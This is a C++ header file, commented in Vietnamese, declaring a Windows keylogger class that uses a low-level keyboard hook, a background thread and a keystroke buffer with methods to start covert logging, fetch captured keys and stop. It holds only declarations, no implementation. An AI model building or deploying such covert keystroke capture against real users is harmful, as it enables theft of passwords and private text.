#pragma once
#include <string>
#include <vector>
#include <mutex>
#include <thread>
#include <windows.h>

class Keylogger {
private:
    // Buffer chua chuoi cac phim da bat duoc
    std::string _logBuffer;

    // Mutex de bao ve buffer khi 2 luong cung truy cap (tranh loi crash)
    std::mutex _mutex;

    // Bien thread de chay keylogger ngam
    std::thread _loggerThread;

    // Bien kiem soat vong lap
    bool _isRunning;

    // Handle cua Hook
    HHOOK _hook;

    // [MỚI] ID của thread chứa vòng lặp Hook.
    // Cần thiết để hàm StopKeyLogging có thể gửi tin nhắn WM_QUIT vào đúng thread này.
    DWORD _threadId;

    // Cac ham phu tro (Helper)
    void RunHookLoop(); // Vong lap chinh cua Keylogger
    void ProcessKey(DWORD vkCode); // Xu ly ma phim tho thanh ky tu

    // Ham callback tinh (bat buoc theo quy dinh cua Windows API)
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

public:
    Keylogger();
    ~Keylogger();

    // 1. Chay keylogger ngam (StartKeyLogging)
    void StartKeyLogging();

    // 2. Lay buffer va xoa buffer cu (GetLoggedKeys)
    std::string GetLoggedKeys();

    // Dung keylogger (Can thiet de don dep bo nho)
    void StopKeyLogging();
};